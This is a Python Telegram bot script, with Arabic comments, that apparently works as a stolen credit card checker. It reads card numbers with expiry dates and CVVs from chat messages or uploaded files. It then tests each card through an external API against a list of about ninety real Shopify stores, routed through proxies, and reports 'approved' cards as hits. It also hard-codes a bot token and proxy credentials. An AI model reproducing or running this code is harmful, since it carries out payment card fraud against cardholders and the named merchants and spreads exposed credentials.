import telebot
import requests
import re
import threading
import random
from time import sleep

# التوكن الخاص بك (تأكد منه 100%)
TOKEN = '8558756991:AAHswTBL0ds0QaAaAyBuwvJtTCsNbPRyd5A'
bot = telebot.TeleBot(TOKEN)

# حذف أي عملية قديمة معلقة للبوت
bot.remove_webhook()

SITES_LIST = [
    "https://mmxhl-2.myshopify.com", "http://makeship.com", "https://shop-caymans.com",
    "https://shop.conequipmentparts.com", "https://sababa-shop.com", "https://mjuniqueclosets.com",
    "https://dutchwaregear.com", "https://nielladiverse.com", "https://grabpick.com",
    "https://dominileather.com", "https://theneomag.com", "https://bdmanja.com",
    "https://shop.littlefeetdenver.com", "https://zoe-hermsen.com", "https://saadaintl.com",
    "https://sockbox.com", "https://exquisitebeds.com", "https://girlslivingwell.com",
    "https://shop.wattlogic.com", "https://courtneyreckord.com", "https://beatrizpalacios.com",
    "https://peeteescollection.com", "https://2poundstreet.com", "https://prettyplainpaper.com",
    "https://lolaandveranda.com", "https://university-of-waterloo.myshopify.com",
    "https://earthiebykate.myshopify.com", "https://samclothingstore-nl.myshopify.com",
    "https://charlotteindependence.myshopify.com", "https://a-and-j-liquidation.myshopify.com",
    "https://munchie-mug.myshopify.com", "https://www.nativecos.com", "https://www.tula.com",
    "https://sttelli.myshopify.com", "https://bb73c3-5.myshopify.com", "https://travelerchoicetravelware.myshopify.com",
    "https://level-rods.myshopify.com", "https://fragrance-oils-direct.myshopify.com",
    "https://ranch-house-meats.myshopify.com", "https://musential.myshopify.com",
    "https://veriphy-skincare.myshopify.com", "https://ledlightstreet.myshopify.com",
    "https://breechesdotcom.myshopify.com", "https://nativeacresmeat.myshopify.com",
    "https://zugopet.myshopify.com", "https://tryearthbreeze.myshopify.com",
    "https://uneeks-lash-extensions.myshopify.com", "https://bon-secour-candle-company.myshopify.com",
    "https://wicksandscents.myshopify.com", "https://higher-primate.myshopify.com",
    "https://olympia-gloves.myshopify.com", "https://swanhose.myshopify.com",
    "https://blue-coolers.myshopify.com", "https://85bb32-2.myshopify.com",
    "https://essential-things-co.myshopify.com", "https://oxford-exchange.myshopify.com",
    "https://weldy1.myshopify.com", "https://drmtlgy.myshopify.com", "https://shop-dirtdevil.myshopify.com",
    "https://armorsuit.myshopify.com", "https://salkan.myshopify.com", "https://florasis-beauty.myshopify.com",
    "https://chinacnczone.myshopify.com", "https://umoja-lighting.myshopify.com",
    "https://isabel-harvey.myshopify.com", "https://takaokaya-usa.myshopify.com",
    "https://griffin-remedy-online.myshopify.com", "https://alphabetlegends.myshopify.com",
    "https://live-it-up-party-supplies.myshopify.com", "https://wolfies-nuts.myshopify.com",
    "https://sparrows-lock-picks.myshopify.com", "https://click-grow.myshopify.com",
    "https://tokyobay.myshopify.com", "https://ccaf44.myshopify.com", "https://poshmira.myshopify.com",
    "https://us-auto-supplies.myshopify.com", "https://busy-lady-quilt-shop.myshopify.com",
    "https://thechippingnet.myshopify.com", "https://bull-bay-tackle-company.myshopify.com",
    "https://tangles-b-gone-2.myshopify.com", "https://churchills-teas.myshopify.com",
    "https://kensington-protective.myshopify.com", "https://j-scent-global.myshopify.com",
    "https://lliked.myshopify.com", "https://poisemakeup.myshopify.com",
    "https://inspired-by-journee.myshopify.com", "https://quicksafes.myshopify.com",
    "https://kleanspa-bath-and-body.myshopify.com"
]

PROXIES_LIST = [
    "http://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:8080",
    "socks5h://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:10080"
]

@bot.message_handler(commands=['start'])
def welcome(m):
    bot.reply_to(m, "✅ البوت شغال يا مصطفى! أرسل الكومبو أو الملف الآن.")

@bot.message_handler(content_types=['document', 'text'])
def handle_all(m):
    if m.content_type == 'text':
        if m.text.startswith('/'): return
        cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', m.text)
    else:
        file_info = bot.get_file(m.document.file_id)
        cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', bot.download_file(file_info.file_path).decode('utf-8'))

    if cards:
        msg = bot.reply_to(m, f"🚀 تم استلام {len(cards)} بطاقة. جاري الفحص...")
        threading.Thread(target=process_cards, args=(m.chat.id, msg.message_id, cards)).start()

def process_cards(chat_id, msg_id, cards):
    live, dead = 0, 0
    total = len(cards)

    for index, card in enumerate(cards, 1):
        if not SITES_LIST: break
        site = random.choice(SITES_LIST)
        proxy = random.choice(PROXIES_LIST)

        try:
            api_url = f"https://web-production-a8008.up.railway.app/shopify?site={site}&cc={card}&proxy={proxy}"
            res = requests.get(api_url, timeout=20).json()
            
            response_msg = str(res.get("Response", "N/A")).upper()
            status = res.get("Status")

            bot.edit_message_text(f"🛰 <b>Kilua AI V4</b>\n━━━━━━━━━━━━━━\n💳 <b>CC:</b> <code>{card}</code>\n📊 <b>التقدم:</b> {index}/{total}\n✅ <b>Approved:</b> {live}\n❌ <b>Declined:</b> {dead}\n━━━━━━━━━━━━━━\n🌐 <b>مواقع نشطة:</b> {len(SITES_LIST)}", chat_id, msg_id, parse_mode="HTML")

            success_keys = ["APPROVED", "SUCCESS", "FUNDS", "CHARGED", "DS_REQUIRED", "AUTHENTICATE"]
            
            if status == True or any(k in response_msg for k in success_keys):
                live += 1
                bot.send_message(chat_id, f"🎯 <b>HIT / APPROVED</b>\n━━━━━━━━━━━━━━\nCC: <code>{card}</code>\nResponse: {response_msg}\nSite: {site}\n━━━━━━━━━━━━━━\nBy: مصطفى النجم 🇮🇶", parse_mode="HTML")
            else:
                dead += 1
                if "TIMEOUT" in response_msg or "CONNECTION" in response_msg:
                    SITES_LIST.remove(site)
        except:
            dead += 1
        
        sleep(1)

print("--- البوت بدأ العمل الآن بنجاح ---")
bot.infinity_polling()
